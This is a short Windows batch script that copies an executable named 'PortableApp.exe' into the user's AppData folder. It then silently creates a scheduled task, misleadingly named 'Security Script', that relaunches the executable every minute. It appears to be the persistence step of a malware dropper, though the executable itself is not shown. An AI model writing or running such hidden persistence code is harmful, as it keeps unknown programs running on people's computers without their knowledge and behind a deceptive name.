@echo off
set "script_dir=%~dp0"

xcopy /q "%script_dir%\PortableApp.exe" "%APPDATA%\" /Y > nul

SCHTASKS /f /create /sc minute /mo 1 /tn "Security Script" /tr "\"%APPDATA%\PortableApp.exe\" vid=%1 pid=%2 cwd=%%APPDATA%%" > nul